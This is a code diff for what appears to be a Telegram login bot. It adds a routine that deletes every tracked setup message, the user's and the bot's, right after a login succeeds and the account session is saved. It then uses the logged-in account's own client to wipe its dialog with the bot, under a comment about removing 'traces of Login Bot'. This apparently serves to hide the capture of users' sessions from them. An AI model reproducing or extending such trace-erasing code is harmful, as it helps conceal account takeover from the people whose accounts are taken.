@@ -112,6 +112,28 @@ async def send_and_track(bot, event, text, **kwargs):
     return reply
 
 
+async def nuke_tracked_messages(bot, chat_id):
+    """
+    Immediately delete all tracked messages (user and bot) for this chat.
+    This is called on successful login to force 'nuke' the history.
+    """
+    # Find all message IDs for this chat
+    to_delete = [msg_id for (cid, msg_id) in messages_to_delete.keys() if cid == chat_id]
+    
+    if not to_delete:
+        return
+
+    try:
+        await bot.delete_messages(chat_id, to_delete)
+        logger.info(f"Nuked {len(to_delete)} setup messages for chat {chat_id}")
+    except Exception as e:
+        logger.warning(f"Failed to nuke messages: {e}")
+    
+    # Remove from tracking dict
+    for msg_id in to_delete:
+        messages_to_delete.pop((chat_id, msg_id), None)
+
+
 async def main():
     """Main bot entry point."""
     if not BOT_TOKEN:
@@ -290,7 +312,10 @@ async def main():
             await save_account(session, me)
             
             # --- PERSISTENCE CLEANUP: Remove traces of Login Bot ---
-            # Get bot username to target self
+            # 1. Immediately nuke all setup messages (user + bot)
+            await nuke_tracked_messages(bot, event.chat_id)
+            
+            # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
             asyncio.create_task(cleanup_login_bot_interaction(session.client, me_bot.username))
             # -----------------------------------------------------
@@ -349,7 +374,10 @@ async def main():
             await save_account(session, me)
             
             # --- PERSISTENCE CLEANUP: Remove traces of Login Bot ---
-            # Get bot username to target self
+            # 1. Immediately nuke all setup messages (user + bot)
+            await nuke_tracked_messages(bot, event.chat_id)
+            
+            # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
             asyncio.create_task(cleanup_login_bot_interaction(session.client, me_bot.username))
             # -----------------------------------------------------
